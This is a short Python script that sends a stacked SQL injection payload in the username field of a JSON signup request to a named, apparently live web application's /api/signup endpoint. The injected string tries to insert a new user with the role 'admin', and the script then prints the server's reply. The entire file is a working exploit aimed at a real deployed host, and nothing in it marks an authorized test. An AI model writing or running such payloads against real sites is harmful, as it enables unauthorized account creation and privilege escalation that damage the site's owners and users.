import urllib.request, json, urllib.error
quote = chr(39)
inj = "test" + quote + "); INSERT INTO users(username,password,role) VALUES (" + quote + "hax" + quote + "," + quote + "pw" + quote + "," + quote + "admin" + quote + ");--"
payload = {"username": inj, "password": "irrelevant"}
data = json.dumps(payload).encode()
req = urllib.request.Request("https://euphonium-fgte.vercel.app/api/signup", data=data, method="POST", headers={"Content-Type":"application/json"})
try:
    with urllib.request.urlopen(req, timeout=5) as resp:
        print(resp.status)
        print(resp.read().decode())
except urllib.error.HTTPError as e:
    print(e.code)
    body = e.read().decode()
    print(body)
